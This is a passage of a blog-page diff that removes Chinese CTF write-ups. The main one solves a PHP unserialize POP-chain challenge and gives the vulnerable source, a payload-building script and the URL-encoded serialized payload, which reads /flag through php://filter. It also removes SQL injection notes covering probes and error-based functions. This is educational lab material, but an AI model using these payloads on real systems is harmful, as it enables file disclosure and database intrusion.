class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line"></span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p style="font-size:16px">看到第一段判断出需要用GET传入一个<strong>wish</strong>的值，然后对其反序列化，接下来需要分析下面一串POP链</p>
-
-<hr>
-<ol>
-<li><p>首先寻找终点</p>
-<p>我们在<strong>Try_Work_Hard</strong>类终发现了<strong>include</strong>函数判断出这里可以使用php伪协议来读取最后的$flag$文件,接下来判断如触发这个<strong>append</strong>函数，我们发现  <strong>__invoke</strong> 魔术方法中存在append函数得知需要发动 <strong>__invoke</strong> 魔术方法来达到终点， <strong>__invoke</strong> 魔术方法是当一个类被当做函数运行的时候发动</p>
-<p style="font-size:12px">这里我们可以先对var这个append执行的值进行payload构建,<strong>$var=php://filter/convert.base64-encode/resource=/flag</strong></p></li>
-<li><p>接下来找到如何让__invoke魔术方法发挥作用的地方</p>
-<p>我们发现在<strong>Make_a_Change</strong>类中 <strong>__get</strong>魔术方法中有<code>return $function();</code><br>$function$的值可控，我们可以让$function$的值等于一个<strong>Try_Work_Hard</strong>类</p>
-</li>
-<li><p>接着寻找让__get魔术方法启动的地方，我们知道__get魔术方式是当我们访问一个类中私有或不存在的成员属性的时候自动触发，因此我们来到<strong>Road_is_Long</strong>，发现当中的__toString魔术方法访问了一个page变量，那我们可以让$this-&gt;string$等于<strong>Make_a_Change</strong>类，这样就能出发 <strong>__get</strong> 魔术方法，**__toSting<strong>魔术方法是当一个类被当做字符串使用时自动触发，我们就发现 <strong>__wakeup</strong>魔术方法中就有将字符串赋值给一个变量$page$而且$page$的值可控，那我们就让$page$等于一个</strong>Road_is_Long**类，我们暂且称第一个 <strong>Road_is_Long</strong> 类为$a$，第二个为$b$</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = new Make_a_Change();</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>a也就是我们要传入的wish，当a反序列化前会执行__wakeup魔术方法，这是会触发b的__toString在这时触发*<strong>Make_a_Change</strong>的__get魔术方法再到 <strong>Try_Work_Hard</strong>的__invoke魔术方法最后执行append提取到flag</p>
-</li>
-</ol>
-<h2 id="我们最终获得的POP链如下"><a href="#我们最终获得的POP链如下" class="headerlink" title="我们最终获得的POP链如下"></a>我们最终获得的POP链如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Road_is_Long::__wakeup() -&gt; Road_is_Long::__toString() -&gt; Make_a_Change::__get() -&gt; Try_Work_Hard::__invoke() -&gt; Try_Work_Hard::append()</span><br></pre></td></tr></table></figure>
-
-<h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$f = new Try_Work_Hard();</span><br><span class="line">$m = new Make_a_Change();</span><br><span class="line">$m-&gt;effort = $f;</span><br><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = $m;</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>GET</strong>传入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-
-    </div>
-
-    
-  </div>
-  
-    
-    <h3 class="article-read"><a href="/2024/08/04/2022-popchains/"><span>more</span></a></h3>
-    
-  
-</article>
-
-
-
-
-
-  <article class="article-container ">
-
-  
-    
     <h3 class="article-title"><a href="/2024/07/28/[BJDCTF 2020]easy_md5/"><span>BJDCTF 2020_easy_md5题解</span></a></h3>
     
   
@@ -785,166 +928,6 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
   
     
     <h3 class="article-read"><a href="/2024/07/28/[BJDCTF 2020]easy_md5/"><span>more</span></a></h3>
-    
-  
-</article>
-
-
-
-
-
-  <article class="article-container ">
-
-  
-    
-    <h3 class="article-title"><a href="/2024/07/28/PHP反序列化/"><span>PHP反序列化</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2024/07/28/PHP反序列化/" rel="bookmark">
-        <time class="entry-date published" datetime="2024-07-28T05:31:36.000Z">
-          2024-07-28
-        </time>
-      </a>
-    </span>
-    <br />
-    
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-          
-      
-    </div>
-    
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-
-    </div>
-
-    
-  </div>
-  
-    
-    <h3 class="article-read"><a href="/2024/07/28/PHP反序列化/"><span>more</span></a></h3>
-    
-  
-</article>
-
-
-
-
-
-  <article class="article-container ">
-
-  
-    
-    <h3 class="article-title"><a href="/2024/07/22/Sql/"><span>Sql</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2024/07/22/Sql/" rel="bookmark">
-        <time class="entry-date published" datetime="2024-07-22T06:19:06.000Z">
-          2024-07-22
-        </time>
-      </a>
-    </span>
-    <br />
-    
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-          <h2 id="Sql注入基本步骤"><a href="#Sql注入基本步骤" class="headerlink" title="Sql注入基本步骤"></a><font color = '008000'>Sql注入基本步骤</font></h2><ol>
-<li>查找注入点</li>
-<li>判断是字符型还是数字型注入 and 1&#x3D;1 and 1&#x3D;2 &#x2F; 3-1</li>
-<li>如果是字符型判断他的闭合方式, ‘ “ ‘) “)</li>
-<li>判断数据列数 group by &#x2F; order by</li>
-<li>寻找回显位置</li>
-</ol>
-<hr>
-<h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a><font color = '008000'>相关命令</font></h2><ol>
-<li><code>database()</code></li>
-<li><code>group_concat()</code></li>
-<li><code>concat()</code></li>
-<li><code>substring(),00,30</code></li>
-</ol>
-<hr>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><font color = '008000'>报错注入</font></h2>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(XML_document,XPath_string)</span><br><span class="line"></span><br><span class="line">updatexml(XML_document,XPath_string,new_value)</span><br></pre></td></tr></table></figure>
-<h3 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a><font color = '808044'>floor报错</font></h3><table>
-<thead>
-<tr>
-<th>涉及函数</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>rand()</td>
-<td>随机生成0~1之间的小数</td>
-</tr>
-<tr>
-<td>floor()</td>
-<td>小数向下取整数。向上取整数ceiling()</td>
-</tr>
-<tr>
-<td>concat_ws()</td>
-<td>将括号内数据用第一个字段连接起来</td>
-</tr>
-<tr>
-<td>group_by</td>
-<td>分组语句，常用于，结合统计函数，根据一个或多个列对结果集进行分组</td>
-</tr>
-<tr>
-<td>as</td>
-<td>别名</td>
-</tr>
-<tr>
-<td>count()</td>
-<td>汇总统计数量</td>
-</tr>
-<tr>
-<td>limit</td>
-<td>这里用于显示指定行数</td>
-</tr>
-</tbody></table>
-
-      
-    </div>
-    
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-
-    </div>
-
-    
-  </div>
-  
-    
-    <h3 class="article-read"><a href="/2024/07/22/Sql/"><span>more</span></a></h3>
     
   
 </article>
